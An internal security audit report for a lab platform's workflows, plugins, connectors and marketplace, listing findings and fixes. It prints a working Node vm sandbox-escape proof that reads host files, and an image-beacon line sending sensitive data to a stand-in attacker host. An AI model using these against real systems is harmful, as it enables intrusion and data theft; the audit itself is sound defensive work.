# Phase 4 Security Audit — Workflows, Connectors, Marketplace, and Plugin UI

Audit date: 2026-06-25  
Previous audit baseline: `a1e3003` (2026-06-23)  
Reviewed worktree: `.claude/worktrees/sp-a2`  
Reviewed through: `8a8ee5f`, plus the uncommitted `pack.ts` / `pack.test.ts` changes present during the audit

## Executive summary

Pause the Phase 4 host-DHIS2 cutover until the five cutover blockers below are addressed.

The most serious issue is a confirmed escape from the Workflow Code node's Node `vm` context. Workflow code can access the host Node process and filesystem. The plugin webview also permits arbitrary HTTPS image requests, allowing an installed plugin to exfiltrate data obtained from broker calls.

The DHIS2 webview cutover currently weakens authorization: native DHIS2 routes require `lab_admin`, but plugin UI discovery and broker `storage.*` / `invoke` calls are available to every authenticated user. In addition, the global plugin-egress kill switch does not block connector metadata, test, or push operations, and the workflow HTTP allowlist can be bypassed through redirects.

No source changes were made by this audit.

## Cutover blockers

### SEC-01 — Critical: Workflow Code node escapes the sandbox

Files:

- `packages/workflows/src/engine/sandbox.ts:22-51`
- `packages/workflows/src/engine/sandbox.ts:54-92`
- `packages/workflows/src/engine/sandbox.test.ts:24-26`

The Code node uses `vm.runInNewContext()` inside a worker as a security boundary. Node's `vm` module is not a secure isolation mechanism for untrusted code.

The existing test only checks whether `require`, `process`, and `fetch` are directly defined. It does not test constructor-chain escapes.

Confirmed proof:

```js
this.constructor.constructor('return process')().versions.node
```

This returned the host Node version. The following proof also successfully read the repository's `package.json`:

```js
const p = this.constructor.constructor('return process')();
return p.getBuiltinModule('node:fs')
  .readFileSync('package.json', 'utf8')
  .slice(0, 30);
```

Impact:

- Host filesystem read/write
- Network access through Node built-ins
- Environment and secret exposure
- Process-level capabilities
- Possible lateral access to databases and internal services

Recommendation:

1. Disable Code nodes before further rollout.
2. Replace the Node `vm` boundary with a separate restricted process/container or a purpose-built isolate.
3. Use an unprivileged OS identity, a minimal filesystem, no inherited secrets, no network by default, and hard CPU/memory/time limits.
4. Add adversarial escape tests rather than tests that only check missing globals.

Interim remediation applied 2026-06-26: Code-node execution is now gated behind a new
`WORKFLOW_CODE_ENABLED` config flag (default **false**). The handler
(`packages/workflows/src/engine/node-handlers/code.ts`) refuses to run — before the worker
is started — with a clear error when the flag is off, and emits a loud host-level-privilege
warning when an enabled Code node runs. The misleading "require/process/fetch undefined" test
was replaced/augmented with an honest adversarial test
(`packages/workflows/src/engine/sandbox.test.ts`) that asserts the `vm` constructor-chain
escape WORKS (reaches the host `process`) — documenting why Code nodes are off by default.
A real-isolate replacement (separate unprivileged process / `isolated-vm`) is tracked as the
proper long-term fix (see the comment block atop `sandbox.ts`).

### SEC-02 — Critical: Plugin iframe can exfiltrate broker data

Files:

- `apps/web/src/plugins/PluginFrame.tsx:6-12`
- `apps/web/src/plugins/PluginFrame.tsx:41-46`

The iframe correctly omits `allow-same-origin` and has `connect-src 'none'`, but its CSP permits:

```text
img-src data: https:
```

Plugin JavaScript can read reports, FHIR facilities, connector metadata, or plugin storage through the broker and then leak values by assigning an attacker-controlled HTTPS image URL:

```js
new Image().src =
  'https://attacker.example/collect?data=' +
  encodeURIComponent(JSON.stringify(sensitiveData));
```

`connect-src 'none'` does not prevent image loads.

Recommendation:

- Change the webview CSP to `img-src data:` unless remote images are an explicit, separately permissioned capability.
- Consider explicitly restricting `form-action`, `navigate-to` where supported, `base-uri`, and other navigation/exfiltration paths.
- Add a browser security test proving that network requests cannot leave the iframe.

### SEC-03 — High: DHIS2 cutover removes the existing admin authorization boundary

Files:

- `apps/server/src/plugin-ui-routes.ts:23-43`
- `apps/server/src/plugin-ui-routes.ts:70-85`
- `apps/web/src/shell/AppShell.tsx:44-51`
- `apps/web/src/shell/AppShell.tsx:93-112`
- `packages/bootstrap/src/plugin-broker.ts:47-59`
- `packages/bootstrap/src/plugin-broker.ts:125-135`

Current native DHIS2 routes require `lab_admin`. After cutover:

- Any authenticated user can discover and open installed plugin UIs.
- `storage.get`, `storage.put`, `storage.delete`, `storage.list`, and `invoke` have no caller-role requirement.
- The broker accepts a client-controlled plugin ID from the URL and scopes storage to that ID.

This allows any authenticated user to call the broker directly for `dhis2-sink` and read or modify:

- Mappings
- Org-unit mappings
- Cached metadata
- Push history
- Other plugin-owned data

They may also invoke declared WASM entrypoints.

Recommendation:

1. Add role requirements to plugin UI contributions or a server-side plugin ACL model.
2. Filter `/api/plugins/ui` and sidebar entries by the caller's permitted roles.
3. Apply the plugin-level role requirement to every broker operation, including `storage.*` and `invoke`.
4. For the immediate DHIS2 cutover, require `lab_admin` for the `dhis2-sink` UI and all its broker operations.
5. Add tests using `lab_technician` and other non-admin roles against direct broker calls.

### SEC-04 — High: `PLUGIN_EGRESS_ENABLED=false` does not block connector egress

Files:

- `packages/bootstrap/src/plugin-broker.ts:36-44`
- `packages/bootstrap/src/policy.ts:14-22`
- `packages/bootstrap/src/index.ts:408-440`

Connector operations map to `host:connectors`, while `policyAllows()` disables egress only when the gate string is exactly `net-egress`.

Consequently, the global egress switch does not stop:

- `connectors.test`
- `connectors.metadata`
- `connectors.push`

These operations can decrypt connector credentials and perform outbound network requests.

Recommendation:

- Classify broker operations by both host-service capability and side effect, or explicitly mark egressing operations.
- When `PLUGIN_EGRESS_ENABLED=false`, reject at least connector test, metadata, push, and any future outbound host operation.
- Add tests proving the kill switch blocks actual connector target invocation.

### SEC-05 — High: Workflow HTTP allowlist is bypassable through redirects

Files:

- `packages/workflows/src/engine/services.ts:59-88`
- `packages/workflows/src/engine/services.test.ts:12-31`

`guardedFetch()` validates only the original URL's hostname and then calls `fetch()` with its default redirect handling. Redirect targets are not revalidated.

Confirmed proof:

1. An allowlisted `localhost` URL returned a redirect.
2. The redirect target was an unlisted `127.0.0.1` URL.
3. `guardedFetch()` followed it and returned the target response.

Impact:

- SSRF to private, loopback, link-local, or cloud metadata services
- Access to internal services not present in the configured allowlist

Recommendation:

1. Use `redirect: 'manual'`.
2. Follow redirects explicitly with a low hop limit.
3. Validate the protocol, hostname, resolved IP addresses, and port on every hop.
4. Decide whether private, loopback, link-local, multicast, and metadata IP ranges should always be denied.
5. Re-resolve and revalidate to reduce DNS-rebinding exposure.

## Additional high-priority findings

### SEC-06 — High: Workflow reads expose secrets to every authenticated user

Files:

- `apps/server/src/workflows-routes.ts:42-49`
- `packages/workflows/src/types.ts:21-55`
- `apps/web/src/workflows/components/node-forms/webhook-form.tsx`
- `apps/web/src/workflows/components/node-forms/http-request-form.tsx`

Workflow list and detail routes have no role gate. Persisted workflow definitions can contain:

- Webhook shared secrets
- HTTP Authorization headers
- Tokens embedded in URLs or request bodies
- SQL and other operational details

Mutation and execution require `lab_admin` or `lab_manager`, but reads are available to every authenticated account.

Recommendation:

- Apply an appropriate role gate to workflow list/detail endpoints.
- Return redacted summaries from list endpoints.
- Move secrets out of workflow definitions into a server-side secret store referenced by opaque IDs.

### SEC-07 — High: Webhooks may be unauthenticated and query-string tokens are accepted

Files:

- `packages/workflows/src/webhook-registry.ts:58-69`
- `apps/server/src/workflows-routes.ts:176-186`

If a webhook trigger has no secret, the route accepts requests without authentication. The route also accepts the token in the query string, where it can leak through logs, browser history, proxies, monitoring tools, and referrer headers.

The complete incoming request headers are forwarded into workflow input, including `x-webhook-token`.

Recommendation:

- Require a server-validated, high-entropy secret for every webhook.
- Accept the secret only in a header.
- Use constant-time comparison.
- Remove authentication headers before forwarding input to the workflow.
- Add request body limits, rate limiting, replay protection where relevant, and concurrency controls.

### SEC-08 — High: Workflow artifact route accepts an arbitrary blob key

File:

- `apps/server/src/workflows-routes.ts:163-174`

The wildcard route passes a caller-controlled key directly to `ctx.blob.get(key)`. A manager/admin who can guess another blob key may retrieve data outside the workflow-artifact namespace, including plugin assets or other stored objects.

Recommendation:

- Require and normalize the `workflow-artifacts/` prefix.
- Prefer an opaque artifact ID resolved through a database record with ownership/type metadata.
- Set safe download filenames and content types from trusted metadata.

### SEC-09 — High: Marketplace registries enable SSRF and server-local path access

Files:

- `apps/server/src/marketplace-routes.ts:175-200`
- `packages/marketplace/src/registry-source.ts:68-94`
- `packages/marketplace/src/registry-source.ts:96-166`

A `lab_admin` can configure:

- Arbitrary HTTP registry base URLs, including internal services
- Arbitrary local filesystem paths

The server then reads from those locations. Even though this requires an administrator, it creates a strong SSRF/local-file primitive and expands the impact of a compromised admin account.

Recommendation:

- Restrict HTTP registry schemes and allowed hosts.
- Validate resolved IP addresses and redirect destinations.
- Consider HTTPS-only remote registries.
- Make local registries configuration-only, or constrain them beneath an operator-configured root using resolved-path containment checks.

## Medium-priority findings

### SEC-10 — Medium: Remote registry downloads have no byte limits

Files:

- `packages/marketplace/src/registry-source.ts:106-124`
- `packages/marketplace/src/registry-source.ts:137-165`
- `packages/marketplace/src/index-json.ts:3-19`

Requests have timeouts, but index, manifest, public key, payload, and UI responses are fully buffered with no response-size cap.

Recommendation:

- Stream responses with strict per-file limits.
- Limit package count, string lengths, and total index size.
- Bound WASM, UI, manifest, and public-key sizes separately.
- Revalidate redirects and final URLs.

### SEC-11 — Medium: UI integrity is not rechecked when loaded

Files:

- `packages/plugins/src/runtime.ts:243-251`
- `packages/plugins/src/runtime.ts:348-357`

UI bytes are hash-checked during installation, but `loadUi()` returns blob contents without comparing them to the signed manifest hash. WASM bytes are reverified on every load.

Recommendation:

- Hash UI bytes in `loadUi()` and compare them with `payload.ui.sha256`.
- Fail closed on missing or mismatched bytes.

### SEC-12 — Medium: Broker request shapes and storage limits need server-side bounds

Files:

- `apps/server/src/plugin-ui-routes.ts:73-84`
- `packages/bootstrap/src/plugin-broker.ts:14-32`
- `packages/db/src/plugin-data-store.ts:49-60`

The broker route only checks that `op` is an object. There is no runtime schema for the operation union, collection/key lengths, document size, filter size, or list-limit range.

Recommendation:

- Parse broker operations with a discriminated Zod schema.
- Bound collection/key names, document byte size, list limits, report parameters, and mapping payloads.
- Add rate and concurrency limits for expensive broker calls.

### SEC-13 — Medium: Connector URL and host validation is too permissive

Files:

- `apps/server/src/connectors-routes.ts:14-24`
- `apps/server/src/connectors-routes.ts:27-38`
- `apps/server/src/connectors-routes.ts:65-93`

Connector config accepts arbitrary strings. `hostFor()` extracts only `hostname`, without restricting scheme, port, userinfo, or private addresses. An invalid `baseUrl` silently produces no allowed host rather than rejecting the connector.

Recommendation:

- Parse and validate connector configuration per plugin.
- Require approved schemes, normally HTTPS.
- Reject malformed URLs.
- Define deliberate rules for ports and private/loopback destinations.
- Consider binding connector configuration to a manifest-declared connector schema.

## Dependency audit

Command:

```console
pnpm audit --prod --audit-level moderate
```

Result:

```text
33 vulnerabilities found
Severity: 2 low | 16 moderate | 13 high | 2 critical
```

Notable installed versions:

- `jspdf@2.5.2` — critical/high advisories, including local-file/path traversal and injection advisories
- `xlsx@0.18.5` — prototype-pollution and ReDoS advisories
- `@fastify/static@8.3.0` — reported vulnerable
- `dompurify@2.5.9` through jsPDF — multiple sanitization advisories

Recommended action:

1. Upgrade jsPDF to a currently patched version.
2. Replace or upgrade SheetJS/XLSX to a maintained patched distribution.
3. Upgrade `@fastify/static`.
4. Re-run the production dependency audit and review every remaining reachable advisory.

### Remediation (SEC-I, 2026-06-26)

- `jspdf` `^2.5.2` → `^4.2.1` (latest). Clears all jsPDF advisories (LFI/path-traversal,
  PDF/HTML injection, AcroForm/addJS object injection, BMP/GIF DoS) and the transitive
  `dompurify` sanitization advisories. The only consumer is `apps/web/src/docs/export/toPdf.ts`
  (client-side "export docs to PDF"); the constructor + `text`/`save`/`addImage`/`getImageProperties`/
  `output('blob')` API is unchanged across v2→v4, so no code change was required. Note: jsPDF 3.0.x
  was insufficient — newer advisories (HTML injection in new-window paths, FreeText object injection)
  are patched only in 4.2.1.
- `@fastify/static` `^8.0.0` → `^9.1.3` (matches the installed `fastify@5`). The `register(fastifyStatic,
  { root })` + `sendFile` usage in `apps/server/src/app.ts` is unchanged; option names are stable.
- `xlsx` `^0.18.5` → maintained SheetJS CDN build `0.20.3`
  (`https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz`, pinned in `packages/bootstrap/package.json`
  and the root devDep). Clears both HIGH advisories (prototype-pollution GHSA-4r6h, ReDoS GHSA-5pgg).
  Note: these advisories live in the **parse** path. OpenLDR uses xlsx **write-only**
  (`XLSX.utils.json_to_sheet`/`book_new`/`book_append_sheet` + `XLSX.write` in
  `packages/bootstrap/src/index.ts` and `report-scheduler.ts`); there is no `XLSX.read`/`readFile`,
  so the advisories were not reachable even before the bump. The `XLSX.utils.*`/`XLSX.write` API is
  unchanged at 0.20.3.

Post-remediation `pnpm audit --prod --audit-level high`:

```text
Severity: 0 low | 0 moderate | 3 high | 0 critical
```

The 3 remaining HIGH advisories are all `kysely@0.27.6` (JSON-path traversal in
`JSONPathBuilder.key()`/`.at()`, patched `>=0.28.17`). **Not reachable:** OpenLDR uses none of the
kysely JSON-path builder methods (`.jsonPath()`/`.key()`/`.at()`) — grep confirms the only JSON
access is a single hardcoded raw-SQL literal `definition->>'kind'` (`packages/db/src/dhis2-store.ts`,
no interpolation; that file is removed in the Phase-4 cutover). The `kysely@>=0.28.17` bump is a
core data-layer change with broad blast radius, so it is tracked as a separate follow-up rather than
folded into SEC-I; the advisory carries no exploitable path in the current code. jsPDF and xlsx
advisories are fully cleared; the 2 criticals are gone.

## Positive controls observed

- Connector secrets are encrypted at rest using AES-256-GCM.
- Connector list/get paths exclude encrypted configuration.
- Connector native routes are `lab_admin` gated.
- Plugin WASM and UI bytes are integrity-checked during install.
- WASM is re-hashed on load.
- Plugin iframe omits `allow-same-origin`.
- Broker connector errors are generalized before being returned to plugins.
- Marketplace bundle refs and UI entry filenames have traversal checks.
- Marketplace artifact signatures and acknowledged capability sets are verified.
- Workflow SQL uses a read-only transaction, statement timeout, and row cap.
- Code-node workers have memory and timeout termination controls; these limit availability impact but do not prevent the confirmed sandbox escape.

## Verification performed

Targeted suites:

```console
pnpm -C packages/bootstrap test -- plugin-broker policy plugin-schedule dhis2-orchestration
# 62 tests passed

pnpm -C apps/server test -- connectors-routes marketplace-routes plugin-ui-routes workflows-routes
# 57 tests passed

pnpm -C packages/workflows test -- sandbox services webhook-registry trigger-runner
# 27 tests passed

pnpm -C packages/marketplace test -- registry-source bundle-fs pack grant artifact-manifest
# 45 tests passed
```

Total targeted result: 191 tests passed.

Other checks:

```console
git diff --check a1e3003..HEAD
git diff --check
```

Both completed without whitespace errors.

The full monorepo gate was not run because Phase 4 was still being actively modified during the audit.

## Recommended remediation order

1. Disable or replace the Workflow Code node sandbox.
2. Remove plugin iframe network exfiltration paths.
3. Restore the native DHIS2 `lab_admin` authorization boundary before deleting native routes.
4. Make `PLUGIN_EGRESS_ENABLED` block every outbound connector operation.
5. Fix redirect-aware SSRF validation for workflow HTTP requests.
6. Protect workflow definitions and webhook secrets.
7. Constrain workflow artifact blob access.
8. Harden registry URLs, local paths, redirects, and response sizes.
9. Add UI hash verification on load and broker request-size/schema limits.
10. Upgrade vulnerable production dependencies.

